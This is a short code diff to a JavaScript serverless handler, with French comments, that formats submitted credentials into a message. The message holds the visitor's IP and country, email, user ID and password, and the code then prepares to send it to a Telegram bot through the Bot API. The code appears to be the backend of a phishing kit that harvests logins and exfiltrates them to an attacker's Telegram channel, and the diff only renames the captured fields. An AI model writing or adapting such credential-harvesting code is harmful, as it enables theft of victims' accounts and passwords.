@@ -44,8 +44,9 @@ export default async function handler(req, res) {
     // --- 3. Créer le message formaté
     const message = `Nouvelle soumission :
 🌍 IP : ${ip} (${country})
-📧 Email : ${email}
-🔑 Mot de passe : ${motDePasse}`;
+📧 Email : ${usermail}
+📧 ID : ${user}
+🔑 PASS : ${pass}`;
 
     // --- 4. Envoyer le message à Telegram
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
